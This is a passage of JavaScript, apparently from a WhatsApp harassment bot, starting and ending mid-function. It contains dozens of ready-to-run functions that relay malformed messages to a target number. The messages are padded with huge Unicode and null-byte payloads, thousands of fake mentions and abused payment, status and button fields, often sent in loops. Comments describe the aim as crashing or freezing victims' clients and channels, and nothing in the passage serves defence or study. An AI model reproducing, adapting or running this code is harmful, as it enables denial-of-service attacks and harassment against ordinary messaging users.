                        "https://stickerPack/./" +
                        "ꦾ".repeat(19000),
                    thumbnailUrl: null,
                    quotedAd: {
                        advertiserName: "ི꒦ྀ".repeat(19000),
                        mediaType: 2,
                        jpegThumbnail: "/9j/8HACE82HSGSI",
                        caption:
                            "Ente kadang kadang ente" +
                            "ꦾ".repeat(19000) +
                            "ꦽ".repeat(19000),
                    },
                    pleaceKeyHolder: {
                        remoteJid: "0@s.whatsapp.net",
                        fromMe: false,
                        id: "ABCD1234567",
                    },
                },
            },
        },
    };
    await sock.sendMessage(target, bokep);
}

async function crashsystemuii(sock, target) {
  let billyX = [];
  billyX.push({
    name: "single_select",
    buttonParamsJson: "🩸billytzyOfficial",
  });
  for (let i = 0; i < 20000; i++) {
    billyX.push({
      name: "address_message",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    });
  }
  
  let billyMsg = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "𝐹𝑎𝑛𝑡𝑧𝑦 𝑋 𝑋𝑒𝑣𝑜☠️",
          },
          nativeFlowMessage: {
            messageParamsJson: "{{".repeat(10000),
            buttons: billyX,
          },
          contextInfo: {
            participant: target,
            remoteJid: "status@broadcast",
            stanzaId: "🩸" + "-Id" + Date.now(),
            isForwarded: true,
            forwardingScore: 111,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1998
                }, () => "7" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
              ),
            ],
          },
        },
      },
    },
  };
  
  await sock.relayMessage(target, billyMsg, {
    messageId: null,
    participant: { jid: target },
  });
}

async function kanjutmelar(sock, target) {
  await sock.relayMessage(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "ꦾ".repeat(16890) + "ꦽ".repeat(16890),
          },
          footer: {
            text: "kenal panji ga?",
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(16890),
            messageVersion: 3,
            buttons: [
              { name: "single_select", buttonParamsJson: "ꦽꦽꦾ".repeat(16890) },
              { name: "galaxy_message", buttonParamsJson: "ꦽꦾ".repeat(16890) },
              { name: "call_message_request", buttonParamsJson: "ꦽꦾ".repeat(16890) },
            ],
          },
        },
      },
    },
  }, {
    groupId: null,
    participant: { jid: target }
  });
}

async function XnxxCom(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"putra","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function FonkepUltra(sock, target) {
    const K = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    messageSecret: Buffer.alloc(),
                    deviceListNetadata: {},
                    deviceListMetadataVersion: 2,
                },
                contectMessage: {
                    vcard: null,
                    displayName: "." + "꧀".repeat(30000) + "⿻".repeat(120000),
                    contextInfo: {
                        mentionedJid: ["13135550002@s.whatsapp.net"]
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, K, {
        messageId: null,
        participant: { jid: target }
    })
}

async function OneHitDenglay(sock, target) {
  const Mention = Array.from({ length: 3000 }, (_, p) =>
    `628317784314${k + 4}@s.whatsapp.net`
  );
  const K = {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Mention
      },
      body: {
        text: "",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
          name: "kalerong_anjeng_banget",
          paramsJson: "\u0000".repeat(900000),
          version: 3
        }
    }
  };
  for(let k = 0; k < 500; k++) {
  await sock.relayMessage(target, K, {});
}
}

async function begalGb(sock, target) {
const MakLo = {
  groupStatusMessageV2: {
    message: {
     extendedTextMessage: {
       text: "\u0000".repeat(550000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1999 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     };
     
   const msg = generateWAMessageFromContent(target, MakLo, {});
        
     await sock.relayMessage(target, msg.message, {
            messageId: msg.key.id
        });
     }

async function dileycok(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target } });

  await new Promise(resolve => setTimeout(resolve, 500));

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "\u0000".repeat(500000),
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ]
          }
        }
      }
    }
  }, { participant: { jid: target } });
}

async function FrezeeChat(sock, target) {
 await sock.relayMessage(target, {
     interactiveMessage: {
       body: {
         text: "Panji"
            },
            nativeFlowMessage: {
              buttons: [
{
   name: "review_and_pay",
   buttonParamsJson: JSON.stringify({
      currency: "IDR",
      total_amount: { 
      value: 999999999999, 
      offset: 100 
      },
      reference_id: "\u0000".repeat(5000),
      order: {
      status: "pending",
      items: [
      {
      name: "饝噦饝喌饝喆饝喛".repeat(9999),
      amount: { value: 100000, offset: 100 },
      quantity: 99999
            }
         ]
      }
   })
}
],
},
},
}, { participant: { jid: target }});

await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'饝噦饝喌饝喆饝喛'.repeat(90000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"MakLo","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}


async function DailaySaigma(sock, target) {
    const msg1 = {
        groupStatusMessageV2: {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "K{}K",
                            format: "DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\u0000".repeat(104590),
                            version: 3
                        },
                        entryPointConversionSource: "🔨🕊"
                    },
                    contextInfo: {
                        mentionedJid: [...Array.from({ length: 4000 }, () => "1" + Math.floor(Math.random() * 5000000) + "91@s.whatsapp.net")],
                        isForwarded: true,
                        forwardingScore: 999,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "1@newsletter",
                            serverMessageId: 1,
                            newsletterName: "Hooh"
                        }
                    },
                },
            },
        },
    };

    const msg = await generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            viewOnceMessage: {
                message: {
                    stickerMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                        mimetype: "image/webp",
                        fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
                        fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
                        fileLength: 999,
                        mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
                        directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc",
                        mediaKeyTimestamp: Math.floor(Date.now() / 999),
                        isAnimated: true,
                        isAvatar: null,
                        isAiSticker: true,
                        isLottie: false,
                        height: 512,
                        width: 512,
                        contextInfo: {
                            remoteJid: "status@broadcast",
                            participant: target,
                            externalAdReply: {},
                            quotedMessage: {
                                ImageMessage: {}
                            }
                        }
                    }
                }
            }
        }
    }, {});

    const Payment_Info = await generateWAMessageFromContent(target, {
        groupStatusMessageV2: {
            interactiveResponseMessage: {
                body: {
                    text: "KxK",
                    format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "\x10".repeat(104590),
                    version: 3,
                },
            }
        }
    }, {});

    for (const x of [msg1]) {
        await sock.relayMessage("status@broadcast", x.message ?? x, {
            messageId: x.key?.id || undefined,
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: target } }]
                }]
            }]
        });
    }

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target]
    });

    await sock.relayMessage("status@broadcast", Payment_Info.message, {
        messageId: Payment_Info.key.id,
        statusJidList: [target]
    });
}

async function ngaceng(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(300);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(300);
  
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }


async function begal(sock, target) {
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }

/*
Delay one hit
Saran lop 1-2
*/
async function maling(sock, target) {
const startTime = Date.now();
const duration = 1 * 60 * 1000;
while (Date.now() - startTime < duration) {
await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
     extendedTextMessage: {
       text: "\u0000".repeat(500000),
         contextInfo: {
           participant: target,
             mentionedJid: [
               "0@s.whatsapp.net",
                  ...Array.from(
                  { length: 1950 },
                   () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                 )
               ]
             }
           }
         }
       }
     }, { participant: { jid: target }});
   }
 }


async function ngelayyy(sock, target) {
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});
  
await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: { 
      message: {
        interactiveResponseMessage: {
          body: {
            text: "\0",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }, 
        }
      }
    }
  }, { participant: { jid: target }});

await sleep(500);

  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "MakLo",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: `{"values":{"in_pin_code":"xxx","building_name":"xxx","landmark_area":"X","address":"xxx","tower_number":"maklo","city":"porno","name":"crb","phone_number":"xxx","house_number":"xxx","floor_number":"xxx","state":"yandex | ${"\u0000".repeat(1045000)}"}}`,
            version: 3
          },
          contextInfo: {
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 2,
                expiryTimestamp: Math.floor(Date.now() / 1000) + 86400 
              }
            }
          }
        }
      }
    }
  }, { participant: { jid: target }});
}

async function xlmnop(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    groupStatusMessageV2: { // can switch to viewOnceMessage for channel crash
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32), 
          messageAssociation: {
            associationType: 7, // delete for channel crash
            parentMessageKey: crypto.randomBytes(16) // { id: "larp-larp-larp-sahur" }
          }
        }, 
        pollCreationMessage: {
          name: "There's no limit to larp", 
          options: [
             {
               optionName: "gugugaga"
             },
             {
               optionName: "zaza"
             }
           ],
          selectableOptionsCount: 1,
          pollType: "QUIZ",
          correctAnswer: { optionName: "zaza" },
          contextInfo: {
            isGroupStatus: true
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, msg.message, {});
}

async function pelwr(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        buttons: [
          {
            name: "payment_info",
            buttonParamsJson: `{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"${Date.now()}","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"${'ꦾ'.repeat(5000)}","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"putra","key":"${'\u0000'.repeat(900000)}","key_type":"CPF"}}],"share_payment_status":false}`
          }
        ]
      }
    }
  }, { participant: { jid: target } });
}

async function delayHardCuy(sock, target) {
  await sock.relayMessage(
    target,
    {
  groupStatusMessageV2: { 
    message: {
      interactiveResponseMessage: {
        body: {
          text: "MakLuu",
          format: "DEFAULT",
        },
        nativeFlowResponseMessage: {
          name: "payment_method",
                  buttonParamsJson: `{\"reference_id\":null,\"payment_method\":${"\u0000".repeat(0x2710)},\"payment_timestamp\":null,\"share_payment_status\":false}`,
          version: 3
        },
        contextInfo: {
          remoteJid: Math.random().toString(36) + "\u0000".repeat(9000),
          isForwarded: true,
          forwardingScore: 9999,
          statusAttributionType: 2,
            statusAttributions: Array.from({ length: 19999 }, (_, n) => ({
              participant: `62${n + 836598}@s.whatsapp.net`,
              type: 1
            })),
        },
      },
    },
  },
}, { participant: { jid: target }});
}

async function DelayLoc(sock, target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "( 🍁 )",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "",
                address: "K",
              },
            },
            body: {
              text: "( 🍁 )",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await sock.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}

async function BulldozerLottie(sock, target) {
  const sticker = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
    fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
    fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
    mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
    mimetype: "image/webp",
    directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
    fileLength: { low: 1, high: 0, unsigned: true },
    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
    firstFrameLength: 19904,
    firstFrameSidecar: "KN4kQ5pyABRAgA==",
    isAnimated: true,
    isAvatar: false,
    isAiSticker: false,
    isLottie: false,
    contextInfo: {
      mentionedJid: [target],
      groupMentions: [],
      entryPointConversionSource: "non_contact",
      entryPointConversionApp: "whatsapp",
      entryPointConversionDelaySeconds: 467593,
    },
    stickerSentTs: {
      low: Math.floor(Date.now() / 1000),
      high: 0,
      unsigned: false,
    },
  };

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: sticker,
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});
  
  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function DelayHard(sock, target) {
  const msg = {
    interactiveResponseMessage: {
      header: {
        title: "\u0000" + "{{".repeat(1000)
      },
      body: {
        text: "Garam madu"
      },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        params: {
          json: "\u0000".repeat(2000)
        }
      },
      version: 3,
      entryPointConversionSource: "call permission_request"
    }
  };

  const mbgdly = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from({ length: 2000 }, () => '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net')
            ],
            body: {
              text: 'Garam madu',
              format: 'DEFAULT'
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT'
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{"flow_cta":{"title":${"\u0000".repeat(990000)}}}`,
              version: 3
            }
          }
        }
      }
    }
  };

  for (let i = 0; i < 1500; i++) {
    await sock.relayMessage(target, msg, {}).catch(() => {});
    await sock.relayMessage(target, mbgdly, { participant: { jid: target } }).catch(() => {});
  }
}

async function drainInvisible(sock, target, mention) {
  const ForLong = " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine " + "𑇂𑆵𑆴𑆿".repeat(60000);
  
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
      address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
      url: `${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }

    let msg = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});

    let extendMsg = {
      extendedTextMessage: {
        text: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine " + ForLong,
        matchedText: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine ",
        description: "𑇂𑆵𑆴𑆿".repeat(25000),
        title: " # ⌁⃰𝖅𝖊𝖕𝖍𝖞𝖗𝖎𝖓𝖊 𝕾𝖈𝖍𝖊𝖒𝖆 ⭒ t.me/pherine " + "𑇂𑆵𑆴𑆿".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiJ0lLE0UpIVIzM2Q1RlcpKVJjU2grLD/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2Fxg7HRFjI0Q5Hh/9oADAMBAAIRAxEAPwLuqBJmKs8v2E3k/Uk0jRAAakMmJ1GORFcgjNN1E+J2aT9ZktyI0p5fYtGcUcgY6DTSzIKLZYzNMn5jxwuhJzLHEaJAohqiSkTlUuP4I+UjL6ST/lBknVx4MmQoFEOZmVyGrY7nqeRiZLwXgPRBmT1CKj4mFqHlnkVC/MdH9Z/AivifDrXgf4GvJS7QbFpkz0f8AUz7GvYL/AOcf+X/wDUblq/dYbUvE7+o/fP8AbLyD6hP7x+2XkWv1aofOLuS8F5F+R7sGFUP3j9svI+g/pL9y/ZLyLF6t0PvF3JeC8hNaMOb1zU/bLyL3LsFhUiep9lD/Vj2Fei/V3B0sl/PP+xBpV9ZNeUpLq0RzsGFS0Pp5Q/Yf9S0/qxgfTyh+w/wCpaA4WGwqJ6n2T/fP2I9h96vYP98/Yi4gEW/KQdBQnufZX98/Yj2Dfqrgn4V/Yi6UwMXlL8hfVUf/2Q==",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }

    let msg2 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          extendedTextMessage: extendMsg
        }
      }
    }, {});

    let msg3 = generateWAMessageFromContent(target, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});

    const relayConfig = {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: target },
            content: undefined
          }]
        }]
      }]
    };

    await sock.relayMessage('status@broadcast', msg.message, relayConfig);
    
    relayConfig.messageId = msg2.key.id;
    await sock.relayMessage('status@broadcast', msg2.message, relayConfig);
    
    relayConfig.messageId = msg3.key.id;
    await sock.relayMessage('status@broadcast', msg3.message, relayConfig);
  } catch (err) {
    console.error(err);
  }
}

async function BetaDelayDuaPleR(sock, target) {
    let K = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "K",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let K2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "K",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        K.message,
        {
            messageId: K.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        K2.message,
        {
            messageId: K2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}


async function Sx3(sock, target, amount = 1, mention) { //jangan di ganti amount nya ya anj
  for (let i = 0; i < amount; i++) {
  await sock.sendMessage(target, {
    text: 'hay, im xevo bro',
    footer: ',',
    buttons: [
      {
        buttonId: 'ABCDFG12345678',
        buttonText: {
          displayText: '\0'.repeat(60000)
        },
        type: 4,
      }
    ],
    headerType: 1    
  }, mention ? { 
    participant: { jid: target } } : {})
   }
}






async function bookclick(sock, target, ptcp = true) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: {
        text: "7eppsynC"
      },
      nativeFlowMessage: {
        buttons: [{ name: "booking_status", buttonParamsJson: "{}" }]
      }
    }
  }, ptcp ? {
    participant: { jid: target }
  }: {})
}

async function DelayMaker(sock, target) {
    await sock.relayMessage("status@broadcast", {
      groupStatusMessageV2: {
        interactiveResponseMessage: {
          body: {
            text: "K",
            format: "DEFAULT"
          },
          nativeFlowMessage: {
            buttons: [
              { name: "single_select", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "payment_method", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "call_permission_request", buttonParamsJson: "\u0003".repeat(9999), voice_call: "call_galaxy" },
              { name: "form_message", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "wa_payment_learn_more", buttonParamsJson: "\u0003".repeat(9999) },
              { name: "wa_payment_transaction_details", buttonParamsJson: "\u0003".repeat(9999) },
